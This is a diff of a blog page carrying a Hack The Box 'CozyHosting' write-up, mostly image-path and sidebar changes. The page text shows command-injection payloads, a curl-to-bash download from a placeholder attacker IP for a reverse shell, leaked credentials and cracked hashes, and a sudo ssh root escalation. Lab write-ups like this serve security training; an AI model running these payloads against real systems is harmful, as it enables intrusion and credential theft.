@@ -176,7 +176,7 @@
     <h1 class="brand">
         
             <a href="http://localhost:1313/">
-                <img src="https://avatars.githubusercontent.com/u/138816631" alt="brand image">
+                <img src="/images/pl4stic.png" alt="brand image">
             </a>
         
         
@@ -230,6 +230,16 @@
                 
                         
                 
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
             
         
         
@@ -250,7 +260,15 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="http://localhost:1313/posts/dark-side-of-wifi/">The Dark Side of WiFi: Why Keeping It On Could Be Your Biggest Mistake</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="http://localhost:1313/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance: Why Data Privacy Should Matter to You</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="http://localhost:1313/posts/the-rfid-badge-capture/">The Rfid Badge Capture</a>
                             </li>
                         
                     
@@ -264,6 +282,16 @@
                 
             
                 
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
                 
                         
                 
@@ -309,6 +337,16 @@
                 
             
                 
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
                 
                         
                 
@@ -434,7 +472,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
   
 </div>
 
-  <p><img src="https://blog.shattersec.com/content/images/20250202100317-Pasted%20image%2020250202082056.png" alt="HtB CozyHosting">
+  <p><img src="/images/htb-CozyHosting.png" alt="HtB CozyHosting">
 CozyHosting is an easy-difficulty Linux machine that features a <code>Spring Boot</code> application. The application has the <code>Actuator</code> endpoint enabled. Enumerating the endpoint leads to the discovery of a user&rsquo;s session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application&rsquo;s <code>.jar</code> file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user <code>josh</code>. The user is allowed to run <code>ssh</code> as <code>root</code>, which is leveraged to fully escalate privileges.</p>
 <h2 id="scanning">Scanning</h2>
 <h3 id="nmap">nmap</h3>
@@ -496,7 +534,7 @@ CozyHosting is an easy-difficulty Linux machine that features a <code>Spring Boo
 </span></span><span style="display:flex;"><span>Finished
 </span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
 </span></span></code></pre></div><p>Pretty sure I saw all of those endpoints during my manual look at the website, except for the <code>/error</code> endpoint.  It yielded a 500 response, which can sometimes provide additional details about the web server.</p>
-<p><img src="https://blog.shattersec.com/content/images/20250202101026-Pasted%20image%2020250202005553.png" alt="Whitelabel Error">
+<p><img src="/images/cozyhosting1.png" alt="Whitelabel Error">
 In this case, we see it gives us a <code>Whitelabel Error Page</code>, but nothing else seemingly helpful. A quick Google search of the error page indicates our web server is utilizing Spring Boot, a Java framework. Maybe we have a thread to pull&hellip;</p>
 <blockquote>
 <p><a href="https://www.baeldung.com/spring-boot-custom-error-page" target="_blank">Spring Boot: Customize Whitelabel Error Page</a></p></blockquote>
@@ -552,7 +590,7 @@ In this case, we see it gives us a <code>Whitelabel Error Page</code>, but nothi
 </span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;D70844F51303DB8177B2A99CF37D233D&#34;</span>:<span style="color:#e6db74">&#34;kanderson&#34;</span>,<span style="color:#e6db74">&#34;858CFDC5B39CFDF46E8BC0586C723745&#34;</span>:<span style="color:#e6db74">&#34;UNAUTHORIZED&#34;</span><span style="color:#f92672">}</span>
 </span></span></code></pre></div><h3 id="command-injection">Command Injection</h3>
 <p>Looking at the admin portal, there&rsquo;s a form at the bottom asking for a hostname and username. When messing with the values for these fields, the error messages seem to indicate we might have the opportunity for command injection.</p>
-<p><img src="https://blog.shattersec.com/content/images/20250202101228-Pasted%20image%2020250202013503.png" alt="Command injection location"></p>
+<p><img src="/images/cozyhosting2.png" alt="Command injection location"></p>
 <p>Command injection payload:</p>
 <pre tabindex="0"><code>host=whatever&amp;username=test`&lt;command&gt;`;#
 </code></pre><p>We also notice through testing that any whitespace in the commands does not get properly parsed. This can be remedied by using the <code>${IFS}</code> string in place of all spaces.</p>
@@ -564,24 +602,24 @@ In this case, we see it gives us a <code>Whitelabel Error Page</code>, but nothi
 </span></span></code></pre></div><p>On our attacker machine:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
 </span></span></code></pre></div><p>Lets download and execute our script, saving it in the <code>/tmp</code> folder:</p>
-<p><img src="https://blog.shattersec.com/content/images/20250202101311-Pasted%20image%2020250202013546.png" alt="Injection 1"></p>
+<p><img src="/images/cozyhosting3.png" alt="Injection 1"></p>
 <pre tabindex="0"><code>host=whatever&amp;username=test`curl${IFS}http://&lt;attacker ip&gt;/shell.sh${IFS}-o${IFS}/tmp/shell.sh|bash`;#
 </code></pre><p>For whatever reason, there&rsquo;s no activity on our netcat listener. Trying to troubleshoot the issue, we notice the script was transferred to <code>/tmp</code>, but just wasn&rsquo;t executed. Let&rsquo;s send a command to the victim to execute it again:</p>
-<p><img src="https://blog.shattersec.com/content/images/20250202101337-Pasted%20image%2020250202013719.png" alt="Injection 2"></p>
+<p><img src="/images/cozyhosting4.png" alt="Injection 2"></p>
 <pre tabindex="0"><code>host=whatever&amp;username=test`bash${IFS}/tmp/shell.sh`;#
 </code></pre><p>Great success! We&rsquo;ve got a reverse shell as the <code>app</code> user. We also notice the <code>cloudhosting-0.0.1.jar</code> file, seemingly running the web application.</p>
 <h3 id="jar-inspection">.jar Inspection</h3>
-<p><img src="https://blog.shattersec.com/content/images/20250202145049-Pasted%20image%2020250202014353.png" alt="app Reverse Shell"></p>
+<p><img src="/images/cozyhosting5.png" alt="app Reverse Shell"></p>
 <p><code>.jar</code> files are essentially <code>.zip</code> files. Let&rsquo;s copy the file, unzip it, and see if we can find anything useful.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>grep -r -i <span style="color:#e6db74">&#39;password&#39;</span> .
 </span></span></code></pre></div><p>There&rsquo;s an interesting file, <code>/BOOT-INF/classes/application.properties</code> that has a hardcoded, plaintext password: <code>Vg&amp;nvzAQ7XxRapp</code></p>
-<p><img src="https://blog.shattersec.com/content/images/20250202145150-Pasted%20image%2020250202014729.png" alt="application.properties"></p>
+<p><img src="/images/cozyhosting6.png" alt="application.properties"></p>
 <p>By examining the whole file, we see that the password is used by the application to login to a locally-ran postgres server. Let&rsquo;s connect and see what what can find. We can login using the following command on the reverse shell:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PGPASSWORD=&#39;Vg&amp;nvzAQ7XxR&#39; psql -U postgres -h localhost
 </span></span></code></pre></div><h3 id="postgres-enumeration">Postgres Enumeration</h3>
 <p>Let&rsquo;s see what databases are available to us, and what we can find:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>list
-</span></span><span style="display:flex;"><span>                       List <span style="color:#66d9ef">of</span> databases
+</span></span><span style="display:flex;"><span>                                List <span style="color:#66d9ef">of</span> databases
 </span></span><span style="display:flex;"><span>Name        <span style="color:#f92672">|</span> <span style="color:#66d9ef">Owner</span>    <span style="color:#f92672">|</span> <span style="color:#66d9ef">Encoding</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Collate</span>     <span style="color:#f92672">|</span> Ctype       <span style="color:#f92672">|</span> <span style="color:#66d9ef">Access</span> <span style="color:#66d9ef">privileges</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">------------+----------+----------+-------------+-------------+-----------------------
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>cozyhosting <span style="color:#f92672">|</span> postgres <span style="color:#f92672">|</span> UTF8     <span style="color:#f92672">|</span> en_US.UTF<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> en_US.UTF<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> 
@@ -595,7 +633,7 @@ In this case, we see it gives us a <code>Whitelabel Error Page</code>, but nothi
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">connect</span> cozyhosting
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>dt
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users;
-</span></span></code></pre></div><p><img src="https://blog.shattersec.com/content/images/20250202145234-Pasted%20image%2020250202015242.png" alt="Postgres Dump"></p>
+</span></span></code></pre></div><p><img src="/images/cozyhosting7.png" alt="Postgres Dump"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>   name    <span style="color:#f92672">|</span>                           password                           <span style="color:#f92672">|</span> <span style="color:#66d9ef">role</span> 
 </span></span><span style="display:flex;"><span><span style="color:#75715e">-----------+--------------------------------------------------------------+------
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> kanderson <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$10$E<span style="color:#f92672">/</span>Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim <span style="color:#f92672">|</span> <span style="color:#66d9ef">User</span>
@@ -606,7 +644,7 @@ In this case, we see it gives us a <code>Whitelabel Error Page</code>, but nothi
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
 </span></span></code></pre></div><p>From simple enumeration after getting our reverse shell, there&rsquo;s one user&rsquo;s folder in the <code>/home</code> directory: <code>josh</code>. Let&rsquo;s see if our newly found password works with his account:</p>
-<p><img src="https://blog.shattersec.com/content/images/20250202145307-Pasted%20image%2020250202015556.png" alt="User SSH"></p>
+<p><img src="/images/cozyhosting8.png" alt="User SSH"></p>
 <p>And we&rsquo;ve got the user flag.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /home/josh/user.txt
 </span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
@@ -621,7 +659,7 @@ In this case, we see it gives us a <code>Whitelabel Error Page</code>, but nothi
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /usr/bin/ssh *
 </span></span></code></pre></div><h3 id="gtfobins">GTFOBins</h3>
 <p>Looks as if we can use these <code>sudo</code> privileges to escalate privileges:</p>
-<p><img src="https://blog.shattersec.com/content/images/20250202145338-Pasted%20image%2020250202015817.png" alt="sudo - GTFOBins"></p>
+<p><img src="/images/cozyhosting9.png" alt="sudo - GTFOBins"></p>
 <blockquote>
 <p><a href="https://gtfobins.github.io/gtfobins/ssh/#sudo" target="_blank">https://gtfobins.github.io/gtfobins/ssh/#sudo</a></p></blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>josh@cozyhosting:~$ sudo ssh -o ProxyCommand<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
